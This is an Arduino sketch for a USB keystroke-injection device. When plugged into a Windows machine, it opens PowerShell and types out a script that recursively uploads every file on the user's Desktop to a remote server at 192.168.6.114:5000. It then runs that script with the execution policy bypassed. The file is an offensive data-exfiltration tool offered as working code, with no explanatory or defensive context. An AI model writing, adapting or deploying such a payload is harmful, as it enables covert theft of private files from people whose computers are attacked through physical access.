#include <Keyboard.h>

void setup(){
    Keyboard.begin();
    delay(1000);
    openPowerShell();
    deployScript();
}

void loop(){

}

void openPowerShell(){
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();

    delay(500);  

    Keyboard.print("PowerShell");
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
}

void deployScript() {
  delay(500);

  // Write the script to a temporary .ps1 file
  Keyboard.print("$f='C:\\Users\\Public\\temp.ps1';");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(200);

  // Start appending script to the file
  typeScriptLine("Add-Content $f '$d=[Environment]::GetFolderPath(\\'Desktop\\')'");
  typeScriptLine("Add-Content $f '$u=\\'http://192.168.6.114:5000/upload\\''");
  typeScriptLine("Add-Content $f '$fs=Get-ChildItem -Path $d -Recurse -File'");
  typeScriptLine("Add-Content $f 'foreach($f in $fs){try{$b= @{file=(Get-Item $f.FullName)};Invoke-RestMethod -Uri $u -Method Post -Form $b}catch{}}'");

  // Run the script
  typeScriptLine("powershell -ExecutionPolicy Bypass -File $f");
}

void typeScriptLine(const char* line) {
  Keyboard.print(line);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(300);
}
